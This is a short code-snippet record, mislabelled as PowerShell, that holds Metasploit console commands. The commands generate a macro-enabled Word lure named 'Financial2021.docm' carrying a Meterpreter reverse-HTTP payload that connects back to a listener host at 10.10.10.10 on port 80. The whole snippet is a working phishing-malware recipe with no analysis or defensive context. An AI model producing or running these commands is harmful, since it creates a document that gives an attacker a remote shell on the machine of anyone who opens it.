---
id: a6f31c7a-d0a1-4a3f-b8f6-580bbb71d51f
type: code
language: ps1
verified: false
created_at: '2023-04-06T03:56:23.367445+00:00'
updated_at: '2023-04-10T20:36:54.126660+00:00'
---

# Code Snippet a6f31c7a

**Language**: ps1

```ps1
use exploit/multi/fileformat/office_word_macro
set payload windows/meterpreter/reverse_http
set LHOST 10.10.10.10
set LPORT 80
set DisablePayloadHandler True
set PrependMigrate True
set FILENAME Financial2021.docm
exploit -j
```


